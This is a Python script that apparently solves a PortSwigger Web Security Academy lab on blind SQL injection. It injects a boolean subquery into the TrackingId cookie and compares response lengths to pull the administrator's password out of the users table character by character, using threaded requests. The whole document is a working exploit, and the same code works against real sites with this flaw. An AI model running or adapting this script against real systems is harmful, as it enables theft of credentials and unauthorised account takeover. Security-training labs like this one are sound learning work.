import requests
import string
from concurrent.futures import ThreadPoolExecutor, as_completed
import time

# Target URL
target_url = "https://YOUR-ID.web-security-academy.net/"
cookie_template = "YOUR-TRACKING-ID' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username='administrator')='{char}'--"
session_cookie = "YOUR-SESSION"

# All possible characters (a-z and 0-9)
characters = string.ascii_lowercase + string.digits

# Limit the number of threads to prevent RuntimeError
def get_response_length(position, char):
    time.sleep(0.1)  # Prevent overwhelming the server with requests
    cookies = {
        "TrackingId": cookie_template.format(pos=position, char=char),
        "session": session_cookie
    }
    response = requests.get(target_url, cookies=cookies)
    return char, len(response.text)

# Find best match for a given position
def find_char_for_position(position):
    response_lengths = {}
    max_workers = min(5, len(characters))  # Reduce thread count
    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(get_response_length, position, char): char for char in characters}
        
        for future in as_completed(futures):
            char, length = future.result()
            response_lengths[char] = length

    best_match = max(response_lengths, key=response_lengths.get)
    print(f"[!] Found character '{best_match}' for position {position}")
    return best_match

# Password extraction
password = ""
for pos in range(1, 21):
    print(f"[*] Testing position {pos} [a-z0-9]")
    password += find_char_for_position(pos)

print(f"[+] Extracted password: {password}")
